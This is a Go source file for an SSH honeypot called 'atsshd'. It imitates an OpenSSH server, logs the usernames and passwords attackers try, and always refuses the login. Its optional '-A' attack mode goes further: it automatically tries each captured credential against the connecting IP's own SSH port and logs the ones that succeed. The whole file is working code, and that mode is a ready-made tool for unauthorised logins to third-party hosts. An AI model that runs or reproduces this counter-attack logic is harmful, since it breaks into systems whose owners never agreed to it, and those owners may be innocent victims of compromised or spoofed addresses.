// atsshd
// usage: atsshd [-A] [-b banner] [-p port] [-l logfile] [-h hostkeyfile]

package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"regexp"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	DefPort            = 22
	DefRFCBannerPrefix = "SSH-2.0-"
	DefBanner          = "SSH-2.0-OpenSSH_6.1p2"
	DefCacheTimeout    = 1 * time.Hour
	DefKeyBits         = 2048

	CredBacklog = 2048
)

var (
	listenPort  = flag.Int("p", DefPort, "`port` to listen on")
	hostKeyFile = flag.String("h", "", "server host key private pem `file`")
	logFile     = flag.String("l", "", "output log `file`")
	attackMode  = flag.Bool("A", false, "enable attack mode")
	bannerLine  = flag.String("b", DefBanner, "SSH server `banner`")
)

type Cred struct {
	user string
	pass string
}

type Attacker struct {
	Cred
	host string
}

// a goroutine - maintains the cache of attacker IPs.
func attacker(banner string, attCh <-chan *Attacker) {
	cacheMap := make(map[string]chan *Cred, 1024)
	doneCh := make(chan string, 32)
	for {
		select {
		case attacker := <-attCh:
			credCh, ok := cacheMap[attacker.host]
			if !ok {
				credCh = make(chan *Cred, CredBacklog)
				cacheMap[attacker.host] = credCh
				go attack(attacker.host, banner, credCh, doneCh)
			}
			// non-blocking send so we don't ever get held up.
			select {
			case credCh <- &Cred{attacker.Cred.user, attacker.Cred.pass}:
			default:
			}

		case host := <-doneCh:
			log.Printf("removing %s from cache.\n", host)
			delete(cacheMap, host)
		}
	}
}

// a goroutine - dedicated to serially attacking a host
func attack(host, banner string, credCh <-chan *Cred, doneCh chan<- string) {
	netfailed := 0
	target := net.JoinHostPort(host, strconv.Itoa(DefPort))
	timer := time.NewTimer(DefCacheTimeout)
L:
	for {
		timer.Reset(DefCacheTimeout)
		select {
		case cred := <-credCh:
			if netfailed >= 3 {
				if netfailed == 3 {
					log.Printf("NOT attacking %s: too many network failures.\n", host)
					netfailed = netfailed + 1
				}
				continue // don't connect out after 3 network failures in a row.
			}
			c, err := net.Dial("tcp", target)
			if err != nil {
				log.Printf("Fail: unable to establish tcp connection to %s\n", target)
				netfailed = netfailed + 1
				continue
			}
			netfailed = 0
			cConfig := &ssh.ClientConfig{
				User:          cred.user,
				Auth:          []ssh.AuthMethod{ssh.Password(cred.pass)},
				ClientVersion: *bannerLine,
			}
			conn, _, _, err := ssh.NewClientConn(c, target, cConfig)
			if err != nil {
				log.Printf("Fail: tried attacking %s with %s:%s\n", host, cred.user, cred.pass)
			} else {
				conn.Close()
				log.Printf("*** SUCCESS ***: %s:%s worked on %s\n", cred.user, cred.pass, host)
			}
			c.Close()

		case <-timer.C:
			break L
		}
	}
	doneCh <- host
}

// a goroutine - one for each incoming attacker
func handle(c net.Conn, sConfig *ssh.ServerConfig) {
	defer c.Close()

	log.Printf("Attacker connection from: %s\n", c.RemoteAddr())
	ssh.NewServerConn(c, sConfig)
	log.Printf("Closed connection from: %s\n", c.RemoteAddr())
}

// if keyFile is empty, generate a new RSA key.
func prepareHostKey(keyFile string, bits int) (ssh.Signer, error) {
	var err error
	var pemBytes []byte
	if keyFile != "" {
		pemBytes, err = ioutil.ReadFile(keyFile)
		if err != nil {
			return nil, fmt.Errorf("ERROR: unable to read file: %s\n", keyFile)
		}
	} else {
		log.Printf("Generating %d-bit RSA private key.", bits)
		var pkey *rsa.PrivateKey
		pkey, err = rsa.GenerateKey(rand.Reader, bits)
		if err != nil {
			return nil, err
		}
		blk := &pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(pkey),
		}
		pemBytes = pem.EncodeToMemory(blk)
	}
	signer, err := ssh.ParsePrivateKey(pemBytes)
	if err != nil {
		return nil, err
	}
	return signer, nil
}

func main() {
	flag.Parse()

	match := regexp.MustCompile(`^SSH-2.0-[[:alnum:]]+`).MatchString(*bannerLine)
	if !match {
		log.Fatal("ERROR: SSH2 banner must start with SSH-2.0- and contain at least one additional character")
	}

	if *logFile != "" {
		f, err := os.OpenFile(*logFile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
		if err != nil {
			log.Fatalf("ERROR: unable to open logfile: %s\n", *logFile)
		}
		log.SetOutput(io.MultiWriter(f, os.Stderr))
		log.Printf("Logging output to: %s\n", *logFile)
	}

	attCh := make(chan *Attacker, 32)
	go attacker(*bannerLine, attCh)

	sConfig := &ssh.ServerConfig{
		PasswordCallback: func(conn ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
			if err != nil {
				log.Fatalf("bad host or port: %s\n", conn.RemoteAddr())
			}
			log.Printf("Attacker %s tried: %s:%s\n", host, conn.User(), pass)
			if *attackMode && host != "127.0.0.1" {
				attCh <- &Attacker{
					Cred{conn.User(), string(pass)},
					host,
				}
			}
			return nil, errors.New("password auth failed") // always fail
		},
		ServerVersion: *bannerLine,
	}

	signer, err := prepareHostKey(*hostKeyFile, DefKeyBits)
	if err != nil {
		log.Fatal(err)
	}
	sConfig.AddHostKey(signer)

	ln, err := net.Listen("tcp", ":"+strconv.Itoa(*listenPort))
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("Listening for SSH connections on: %s\n", ln.Addr())

	if *attackMode {
		log.Printf("WARNING: attack mode is on.  Incoming clients will be attacked.\n")
	} else {
		log.Printf("passive mode is on.  Incoming clients will not be attacked.\n")
	}

	for {
		c, err := ln.Accept()
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Temporary() {
				continue
			}
			log.Fatal(err)
		}
		go handle(c, sConfig)
	}
}
